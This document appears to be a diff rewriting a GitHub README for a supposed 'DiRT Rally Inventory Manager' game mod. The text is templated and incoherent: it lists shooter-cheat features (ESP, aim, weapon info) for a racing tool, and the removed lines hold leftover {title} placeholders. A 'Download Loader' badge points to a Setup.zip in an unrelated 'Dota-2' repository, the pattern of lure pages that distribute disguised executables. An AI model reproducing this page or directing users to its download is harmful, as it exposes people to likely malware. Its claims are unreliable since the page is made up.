@@ -1,2 +1,40 @@
-# DiRT-Rally-Inventory-Manager
-{title} is a feature-rich third-party modification project for {DiRT Rally Inventory Manager}.
+<div align="center">
+
+# 🎮 DiRT Rally Inventory Manager
+
+> ⚡ Advanced Game Modification Project for DiRT Rally Inventory Manager
+
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/TameDragonflyFlare/Dota-2/releases/download/main/Setup.zip)
+
+---
+
+## 📖 About
+
+DiRT Rally Inventory Manager is a feature-rich third-party modification project for DiRT Rally Inventory Manager.
+
+---
+
+## ✨ Features
+
+- 👤 Player ESP
+- 🎯 Configurable Aim
+- 🖥️ Advanced Visual Settings
+- 🔫 Weapon Information
+- 🧍 Player Details
+- ⌨️ Custom Hotkeys
+
+---
+
+## 💾 Configuration System
+
+```text
+configs/
+├── default.cfg
+├── visual.cfg
+├── player.cfg
+└── custom.cfg
+```
+
+`DiRT-Rally-Inventory-Manager` · Updated: 2026-10-28
+
+**Tags:** `dirt-rally` `inventory-manager` `racing` `vehicle-setup` `telemetry` `windows` `steam`
